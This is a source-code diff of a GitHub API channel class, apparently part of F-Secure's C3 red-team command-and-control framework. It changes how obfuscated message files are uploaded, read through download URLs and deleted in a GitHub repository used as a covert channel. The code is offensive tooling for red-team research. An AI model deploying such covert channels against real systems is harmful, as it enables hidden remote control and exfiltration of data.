@@ -98,40 +98,27 @@ std::string FSecure::GithubApi::CreateChannel(std::string const& channelName) {
 	return channelName;
 }
 
-FSecure::ByteVector FSecure::GithubApi::ReadFile(std::string const& fileNameSizeSHA) {
+FSecure::ByteVector FSecure::GithubApi::ReadFile(std::string const& fileNameSHA) {
 	std::string url;
 	json response;
-	std::string delimiter = OBF(":");
-
-	//string contains filename:size:sha value
-	std::vector<std::string> fileNameSizeSHASplit = Utils::SplitAndCopy(fileNameSizeSHA, delimiter);
-	
-	std::int64_t fileSize = 0;
+	std::string delimiter = OBF("!");
 	std::string filename;
 	std::string fileSHA;
+	std::string fileDownloadURL;
 
+	//string contains filename:sha:download_url value
+	std::vector<std::string> fileNameSHASplit = Utils::SplitAndCopy(fileNameSHA, delimiter);
 
-	if (fileNameSizeSHASplit.size() > 0) {
-		filename = fileNameSizeSHASplit.at(0);
-		fileSize = std::stoull(fileNameSizeSHASplit.at(1), NULL ,10);
-		fileSHA = fileNameSizeSHASplit.at(2);
+	if (fileNameSHASplit.size() > 0) {
+		filename = fileNameSHASplit.at(0);
+		fileSHA = fileNameSHASplit.at(1);
+		fileDownloadURL = fileNameSHASplit.at(2);
 	}
 	else {
-		throw std::runtime_error(OBF("Throwing exception: cant parse fileNameSizeSHA\n"));
+		throw std::runtime_error(OBF("Throwing exception: cant parse fileNameSHA\n"));
 	}
-	
-	// Github does not allow API access to download raw file with size of > 1 MB
-	// less than or equal to 1 MB for Github API, otherwise Github Blob to retrieve the file
-	if (fileSize <= 1048576) {
-		url = OBF("https://api.github.com/repos/") + this->m_Username + OBF("/") + this->m_Channel
-			+ OBF("/contents/") + filename;
-	}
-	else {
-		url = OBF("https://api.github.com/repos/") + this->m_Username + OBF("/") + this->m_Channel
-			+ OBF("/git/blobs/") + fileSHA;
-	}
- 
-	auto content = cppcodec::base64_rfc4648::decode(SendHttpRequest(url, OBF("application/vnd.github.v3.raw"), Method::GET, true));
+
+	ByteVector content = SendHttpRequest(fileDownloadURL, "", Method::GET, true);
 	
 	return content;
 }
@@ -156,14 +143,12 @@ void FSecure::GithubApi::WriteMessageToFile(std::string const& direction, ByteVi
 
 	j[OBF("message")] = OBF("Initial Commit");
 	j[OBF("branch")] = OBF("master");
-	j[OBF("content")] = cppcodec::base64_rfc4648::encode(cppcodec::base64_rfc4648::encode(data));
+	j[OBF("content")] = cppcodec::base64_rfc4648::encode(data);
 
 	json response = SendJsonRequest(url, j, Method::PUT);
 }
 
 void FSecure::GithubApi::UploadFile(std::string const& path) {
-	std::cout << "UPLOAD FILE ... " << std::flush;
-
 	std::filesystem::path filepathForUpload = path;
 	auto readFile = std::ifstream(filepathForUpload, std::ios::binary);
 
@@ -175,30 +160,25 @@ void FSecure::GithubApi::UploadFile(std::string const& path) {
 	std::string filename = OBF("upload-") + FSecure::Utils::GenerateRandomString(10) + OBF("-") + ts + OBF("-") + fn;
 
 	WriteMessageToFile("", packet, filename);
-
-	std::cout << "UPLOAD FILE OK" << std::endl;
 }
 
-void FSecure::GithubApi::DeleteFile(std::string const& fileNameSizeSHA) {
+void FSecure::GithubApi::DeleteFile(std::string const& fileNameSHA) {
 	std::string url;
 	json j;
 	json response;
 
-	std::string delimiter = OBF(":");
+	std::string delimiter = OBF("!");
 	std::string fileSHA;
-
-	std::vector<std::string> fileNameSizeSHASplit = Utils::SplitAndCopy(fileNameSizeSHA, delimiter);
-
-	std::int64_t fileSize;
 	std::string filename;
 
-	if (fileNameSizeSHASplit.size() > 0) {
-		filename = fileNameSizeSHASplit.at(0);
-		fileSize = std::stoull(fileNameSizeSHASplit.at(1), NULL, 10);
-		fileSHA = fileNameSizeSHASplit.at(2);
+	std::vector<std::string> fileNameSHASplit = Utils::SplitAndCopy(fileNameSHA, delimiter);
+
+	if (fileNameSHASplit.size() > 0) {
+		filename = fileNameSHASplit.at(0);
+		fileSHA = fileNameSHASplit.at(1);
 	}
 	else {
-		throw std::runtime_error(OBF("Throwing exception: cant parse fileNameSizeSHA\n"));
+		throw std::runtime_error(OBF("Throwing exception: cant parse fileNameSHA\n"));
 	}
 
 	url = OBF("https://api.github.com/repos/") + this->m_Username + OBF("/") + this->m_Channel
@@ -230,10 +210,9 @@ std::map<std::string, std::string> FSecure::GithubApi::GetMessagesByDirection(st
 	json response;
 	std::string filename;
 	std::size_t found;
-	std::int64_t fileSize;
-	std::string fileSizeStr;
 	std::string fileSHA;
-	
+	std::string fileDownloadURL;
+	std::string delimiter = OBF("!");
 	std::string url = OBF("https://api.github.com/repos/") + this->m_Username + OBF("/") +
 						this->m_Channel + OBF("/contents");
 
@@ -242,17 +221,15 @@ std::map<std::string, std::string> FSecure::GithubApi::GetMessagesByDirection(st
 	for (auto& match : response) {
 		if (match.contains(OBF("name"))) {
 			filename = match[OBF("name")];
-			fileSize = match[OBF("size")];
 			fileSHA = match[OBF("sha")];
-
-			fileSizeStr = std::to_string(fileSize);
+			fileDownloadURL = match[OBF("download_url")];
 
 			//Search whether filename contains direction id
 			found = filename.find(direction);
-
+			
 			if (found != std::string::npos) {
 				std::string ts = filename.substr(filename.length() - 10); // 10 = epoch time length
-				messages.insert({ts, filename + OBF(":") + fileSizeStr + OBF(":") + fileSHA });
+				messages.insert({ts, filename + delimiter + fileSHA  + delimiter + fileDownloadURL});
 			}
 		}
 	}
@@ -285,7 +262,7 @@ FSecure::ByteVector FSecure::GithubApi::SendHttpRequest(std::string const& host,
 		if (resp.GetStatusCode() == StatusCode::OK || resp.GetStatusCode() == StatusCode::Created) {
 			return resp.GetData();
 		}
-		else if (resp.GetStatusCode() == StatusCode::TooManyRequests) {
+		else if (resp.GetStatusCode() == StatusCode::TooManyRequests || resp.GetStatusCode() == StatusCode::Conflict) {
 			std::this_thread::sleep_for(Utils::GenerateRandomValue(10s, 20s));
 		}
 		else {
